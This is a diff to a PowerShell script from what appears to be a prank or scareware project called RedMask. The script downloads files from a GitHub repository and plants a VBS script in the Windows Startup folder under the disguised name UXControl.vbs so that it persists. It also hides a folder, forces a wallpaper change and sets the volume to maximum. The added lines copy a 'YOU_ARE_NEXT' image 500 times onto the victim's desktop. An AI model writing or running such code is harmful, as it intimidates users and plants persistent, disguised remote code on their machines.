@@ -2,11 +2,19 @@
 Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/wallpaper.jpg" -outfile "$env:USERPROFILE\temp\w.jpg"
 Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/form.png" -outfile "$env:USERPROFILE\temp\f.png"
 Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/sound.wav" -outfile "$env:USERPROFILE\temp\s.wav"
+Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/Stamp.png" -outfile "$env:USERPROFILE\Desktop\YOU_ARE_NEXT.png"
 Invoke-WebRequest "https://raw.githubusercontent.com/Noshbit/RedMask/main/GUI_persistence.vbs" -outfile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\UXControl.vbs"
 attrib +s +h "$env:USERPROFILE\temp";
 
 # Change wallpaper
 Set-ItemProperty 'HKCU:Control Panel\Desktop' Wallpaper "$env:USERPROFILE\temp\w.jpg"; 1..59 | % {RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters -windowstyle hidden;};
+
+# Fill desktop with images
+$f = 0
+WHILE($f -lt 500){
+cp $env:USERPROFILE\Desktop\YOU_ARE_NEXT.png $env:USERPROFILE\Desktop\YOU_ARE_NEXT_$f.png
+$f++
+}
 
 # Set max volume
 Set-SpeakerVolume -Max
